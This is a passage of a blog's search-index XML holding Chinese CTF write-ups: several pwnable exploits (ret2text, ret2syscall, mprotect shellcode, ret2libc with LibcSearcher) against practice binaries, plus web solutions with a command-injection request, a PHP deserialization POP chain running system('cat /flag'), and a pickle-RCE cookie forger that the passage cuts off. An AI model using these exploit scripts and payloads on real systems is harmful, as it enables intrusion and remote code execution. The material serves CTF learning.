<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Pwn_get_started_3dsctf_2016</title>
      <link href="/2024/12/06/Pwn-get-started-3dsctf-2016/"/>
      <url>/2024/12/06/Pwn-get-started-3dsctf-2016/</url>
      
        <content type="html"><![CDATA[<p>最近就是飞来飞去打了一些比赛，基于DBus挖了一些有意思的本地提权，很久没PWN了！</p><span id="more"></span><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>拿到这道题以为是一道简单不能再简单的ret2text，事实证明我年轻了…</p><h2 id="2-正常解法ret2text"><a href="#2-正常解法ret2text" class="headerlink" title="2.正常解法ret2text"></a>2.正常解法ret2text</h2><p>main函数开头就是使用esp寻址，函数开头没有常规的push ebp mov ebp esp操作，说明这题是外平栈，外平栈一般使用esp+x辅助定位，内平栈则是ebp-x辅助定位</p><p><img src="/img/image-20241206110801157.png" alt="image-20241206110801157"></p><p>因此这题算偏移时就是0x38，无需+4</p><p><img src="/img/image-20241206112142717.png" alt="image-20241206112142717"></p><p>另一个坑点是fopen函数打开flag.txt后需要标准输出，因此需要调用fflush()或者exit()</p><p>随后直接按照常规ret2text即可，劫持到fopen这里直接绕过判断</p><p><img src="/img/image-20241206114544864.png" alt="image-20241206114544864"></p><p>照理说这里没有意外，可是出了一些玄学意外</p><p>所以我这里还是按出题者思路去构造if绕过打成了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25129</span>)</span><br><span class="line"></span><br><span class="line">get_flag_addr = <span class="number">0x080489A0</span></span><br><span class="line">exit_addr = <span class="number">0x804E6A0</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>+p32(get_flag_addr)+p32(exit_addr)+p32(<span class="number">814536271</span>)+p32(<span class="number">425138641</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="3-第二种解法ret2syscall"><a href="#3-第二种解法ret2syscall" class="headerlink" title="3.第二种解法ret2syscall"></a>3.第二种解法ret2syscall</h2><p>利用ROPgadget寻找system、&#x2F;bin&#x2F;sh这些发现都没有，打libc太麻烦，用系统调用+可写地址自己写bin&#x2F;sh</p><p>先找pop eax</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x0809e0fa : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080b91e6 : pop eax ; ret</span><br><span class="line">0x0804c56d : pop eax ; ret 0x80e</span><br><span class="line">0x080d9ff8 : pop eax ; ret 0xfff7</span><br><span class="line">0x080dfcd8 : pop eax ; ret 0xfff9</span><br><span class="line">0x0809e0f9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure><p>0x080b91e6 : pop eax ; ret</p><p>再找pop ebx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x080481ad : pop ebx ; ret</span><br><span class="line">0x080d413c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099f96 : pop ebx ; ret 8</span><br><span class="line">0x0806fc31 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x08063adb : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806fc30 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809e0f9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0807b1b0 : pop es ; pop ebx ; ret</span><br><span class="line">0x0806fc08 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805d090 : pop esi ; pop ebx ; ret</span><br><span class="line">0x0805b8a0 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0809efe2 : pop ss ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br></pre></td></tr></table></figure><p>0x0806fc30 : pop edx ; pop ecx ; pop ebx ; ret</p><p>找可写地址，借一下别人的图</p><p><img src="/img/image-20241206123613968.png" alt="image-20241206123613968"></p><p>&#x2F;sh&#x2F;x00需要写在它的后四位。即”0x080eb020+4“，最后需要填入int 0x80：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0806d7e5 : int 0x80</span><br></pre></td></tr></table></figure><p>最后exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29252</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080b91e6</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806fc30</span></span><br><span class="line">int80 = <span class="number">0x0806d7e5</span></span><br><span class="line">mov_edx_eax_ret = <span class="number">0x080557ab</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">56</span>+p32(pop_eax_ret)+<span class="string">&#x27;/bin&#x27;</span>+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0x080eb020</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(mov_edx_eax_ret)</span><br><span class="line">payload += p32(pop_eax_ret)+<span class="string">&#x27;/sh\x00&#x27;</span>+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0x080eb020</span>+<span class="number">4</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(mov_edx_eax_ret)</span><br><span class="line">payload += p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x080eb020</span>)+p32(int80)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-第三种解法"><a href="#4-第三种解法" class="headerlink" title="4.第三种解法"></a>4.第三种解法</h2><p>执行完mprotect函数后返回read函数，从输入端读取<code>mprotect_len</code>长度的内容放入到<code>mprotect_addr</code>。最后传入shellcode即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26854</span>)</span><br><span class="line"></span><br><span class="line">mprotect_addr = <span class="number">0x806EC80</span></span><br><span class="line">mprotect_start = <span class="number">0x080ea000</span></span><br><span class="line">mprotect_len = <span class="number">0x64</span></span><br><span class="line">mprotect_proc = <span class="number">0x7</span></span><br><span class="line"></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806fc30</span></span><br><span class="line"></span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p32(mprotect_addr)+p32(pop_edx_ecx_ebx)+p32(mprotect_start)+p32(mprotect_len)+p32(mprotect_proc)</span><br><span class="line">payload += p32(read_addr)+p32(pop_edx_ecx_ebx)+p32(<span class="number">0</span>)+p32(mprotect_start)+p32(mprotect_len)+p32(mprotect_start)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>二进制太难了~</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN_ciscn_2019_c_1</title>
      <link href="/2024/11/18/Pwn_ciscn_2019_WP/"/>
      <url>/2024/11/18/Pwn_ciscn_2019_WP/</url>
      
        <content type="html"><![CDATA[<p>比较有意思的64位PWN题，中间遇到了一些坑，记录一下</p><span id="more"></span><h2 id="1-分析程序"><a href="#1-分析程序" class="headerlink" title="1.分析程序"></a>1.分析程序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Hello-CTF:/mnt/c/Users/HelloCTF_OS/Desktop/pwnbuu# checksec ciscn_2019_c_1</span><br><span class="line">[*] &#x27;/mnt/c/Users/HelloCTF_OS/Desktop/pwnbuu/ciscn_2019_c_1&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>开了NX，64位程序，是个加解密程序</p><p><img src="/img/image-20241119110616402.png" alt="image-20241119110616402"></p><p>加密函数</p><p><img src="/img/image-20241119112028576.png" alt="image-20241119112028576"></p><h2 id="2-思路"><a href="#2-思路" class="headerlink" title="2.思路"></a>2.思路</h2><p>没有system和&#x2F;bin&#x2F;sh参数，因此需要构造ROP，并且没有给出libc文件，但存在puts函数，可以用于leak，捋一下步骤。</p><ol><li><p>利用栈溢出点实现溢出</p></li><li><p>调用已经使用过的put函数，来暴露put函数真正入口在内存中的偏移地址</p></li><li><p>通过操作系统内存分页存储的特点，通过put函数后三个字节来（每页4kb），比对出libc的版本</p></li><li><p>在得到的libc中找到我们需要的函数（system）和字符（bin&#x2F;bash），之后加上在内存中的偏移量得到二者在内存中真正的地址</p></li><li><p>最后通过溢出来调用system函数执行bin&#x2F;bash命令</p></li></ol><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>距离返回地址(0x50+0x08)字节</p><p>加密函数使用了strlen，可以利用\x00中断绕过</p><p><img src="/img/image-20241119112159959.png" alt="image-20241119112159959"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span> + <span class="number">0x08</span> - <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="构造ROP"><a href="#构造ROP" class="headerlink" title="构造ROP"></a>构造ROP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ciscn_2019_c_1 --only &#x27;pop|ret&#x27;</span><br></pre></td></tr></table></figure><p><img src="/img/image-20241119112421940.png" alt="image-20241119112421940"></p><h3 id="puts真实地址"><a href="#puts真实地址" class="headerlink" title="puts真实地址"></a>puts真实地址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27937</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line">proc = process(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">main_addr = <span class="number">0x400b28</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">87</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice!\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_puts = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_puts))</span><br></pre></td></tr></table></figure><h3 id="system、binsh地址"><a href="#system、binsh地址" class="headerlink" title="system、binsh地址"></a>system、binsh地址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">obj = LibcSearcher(<span class="string">&quot;puts&quot;</span>, libc_puts)</span><br><span class="line"></span><br><span class="line">libc_base = libc_puts - obj.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">libc_sys = libc_base + obj.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">libc_binsh = libc_base + obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">log.info(<span class="string">f&#x27;libc base=<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>; system=<span class="subst">&#123;<span class="built_in">hex</span>(libc_sys)&#125;</span>; /bin/sh=<span class="subst">&#123;<span class="built_in">hex</span>(libc_binsh)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="3-构造EXP"><a href="#3-构造EXP" class="headerlink" title="3.构造EXP"></a>3.构造EXP</h2><p>坑点1：ubuntu18环境需要加个ret补齐栈</p><p>坑点2：和之前32位程序不同，较少参数时64位程序使用寄存器传参，因此构造ROP不同</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">28379</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line">proc = process(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">main_addr = <span class="number">0x400b28</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">87</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice!\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_puts = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#print(hex(libc_puts))</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;puts&quot;</span>, libc_puts)</span><br><span class="line">libc_base = libc_puts - obj.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">libc_sys = libc_base + obj.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">libc_binsh = libc_base + obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"><span class="comment">#log.info(f&#x27;libc base=&#123;hex(libc_base)&#125;; system=&#123;hex(libc_sys)&#125;; /bin/sh=&#123;hex(libc_binsh)&#125;&#x27;)</span></span><br><span class="line">payload2 = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">87</span> + p64(ret) + p64(pop_rdi) + p64(libc_binsh) + p64(libc_sys)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice!\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted&#x27;</span>, payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/img/image-20241119112811274.png" alt="image-20241119112811274"></p><h2 id="4-x86-和-x86-64差异"><a href="#4-x86-和-x86-64差异" class="headerlink" title="4.x86 和 x86_64差异"></a>4.x86 和 x86_64差异</h2><p>在 x86 和 x86_64 两种架构下，ROP 方法的 payload 组织方式不同：</p><ul><li><p>x86 非syscall:</p></li><li><ul><li><p>参数通过栈传递，因此一般无需pop和ret指令；</p></li><li><p>函数能直接访问在payload中预先防止放置的数据，是因为这数据作为些参数通过ebp被访问，而ebp会在函数prologue中设置</p></li><li><ul><li>prologue: push ebp;mov ebp, esp</li><li>epilogue: leave;ret</li></ul></li><li><p>组织形式：FUNCTION ADDR + RETURN ADDR + ARGUMENT_0…N</p></li><li><ul><li>如果要实现执行多个函数，RETURN ADDR需要使用ROP gadget</li></ul></li></ul></li><li><p>x86_64 非syscall:</p></li><li><ul><li>前6个参数依次<a href="https://stackoverflow.com/a/2538212/8706476">通过寄存器传递</a></li><li>gadget 均包含ret指令；</li><li>组织形式：GADGET_0 ADDR + ARGUMENT_0 + GADGET_1 ADDR + … + GADGET_N ADDR + ARGUMENT_N + FUNCTION ADDR</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023贵阳大数据安全精英对抗赛WP</title>
      <link href="/2023/05/04/2023%E8%B4%B5%E9%98%B3%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E7%B2%BE%E8%8B%B1%E5%AF%B9%E6%8A%97%E8%B5%9BWP/"/>
      <url>/2023/05/04/2023%E8%B4%B5%E9%98%B3%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E7%B2%BE%E8%8B%B1%E5%AF%B9%E6%8A%97%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<p>贵阳线下约饭局，线下赛是模拟靶场，难度一般，断网比较坑…</p><span id="more"></span><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="仔细ping"><a href="#仔细ping" class="headerlink" title="仔细ping"></a>仔细ping</h3><p>扫描文件发现flag.php，利用nl读文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?ip=nl%20flag.php</span><br></pre></td></tr></table></figure><p><img src="/img/image-20241119121633727.png" alt="image-20241119121633727"></p><h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>利用fast Destruct绕过报错，pop链(TT-&gt;des —-&gt; JJ-&gt;toString —-&gt; MM-&gt;invoke —-&gt; JJ-&gt;evil)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JJ</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MM</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> TT;</span><br><span class="line"><span class="variable">$exp</span>-&gt;key = <span class="keyword">new</span> JJ;</span><br><span class="line"><span class="variable">$exp</span>-&gt;key-&gt;obj = <span class="keyword">new</span> MM;</span><br><span class="line"><span class="variable">$exp</span>-&gt;key-&gt;obj-&gt;name = <span class="string">&quot;JJ::evil&quot;</span>;</span><br><span class="line"><span class="variable">$exp</span>-&gt;key-&gt;obj-&gt;c = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>);</span><br></pre></td></tr></table></figure><p>无disable_function</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:2:&quot;TT&quot;:2:&#123;s:3:&quot;key&quot;;O:2:&quot;JJ&quot;:1:&#123;s:3:&quot;obj&quot;;O:2:&quot;MM&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;JJ::evil&quot;;s:1:&quot;c&quot;;s:18:&quot;system(&#x27;cat /flag&#x27;);&quot;;&#125;&#125;s:1:&quot;c&quot;;N;</span><br></pre></td></tr></table></figure><p><img src="/img/image-20241119151358906.png" alt="image-20241119151358906"></p><h3 id="JUST-LFI"><a href="#JUST-LFI" class="headerlink" title="JUST_LFI"></a>JUST_LFI</h3><p>改的原题</p><p><a href="https://ctftime.org/writeup/35786">https://ctftime.org/writeup/35786</a></p><p>LFI读文件，获取app.py以及key，直接带回显不行，采用原方式带回显</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">sekai = <span class="string">&quot;Th1sIIIIIIsAAAsecret&quot;</span></span><br><span class="line">unicode = <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tob</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.encode(enc) <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, unicode) <span class="keyword">else</span> <span class="built_in">bytes</span>(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">touni</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span>, err=<span class="string">&#x27;strict&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.decode(enc, err) <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>) <span class="keyword">else</span> unicode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_encode</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; Encode and sign a pickle-able object. Return a (byte) string &#x27;&#x27;&#x27;</span></span><br><span class="line">    msg = base64.b64encode(pickle.dumps(data, -<span class="number">1</span>))</span><br><span class="line">    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())</span><br><span class="line">    <span class="keyword">return</span> tob(<span class="string">&#x27;!&#x27;</span>) + sig + tob(<span class="string">&#x27;?&#x27;</span>) + msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PickleRce</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span 